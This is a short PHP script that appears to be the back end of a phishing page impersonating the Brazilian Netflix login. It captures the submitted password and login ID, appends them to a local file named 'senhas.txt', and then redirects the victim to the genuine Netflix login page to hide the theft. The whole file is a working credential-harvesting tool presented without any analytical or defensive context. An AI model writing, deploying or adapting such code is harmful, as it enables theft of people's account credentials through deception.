<?php
$caixa1 = $_POST["password"] . "\n";
$caixa2 = $_POST["userLoginId"] . "\n";

$file = fopen("senhas.txt","a");

$escrever1 = fwrite($file, $caixa1);
$escrever2 = fwrite($file, $caixa2);

fclose($file);

header("Location: https://www.netflix.com/br/login");
?>
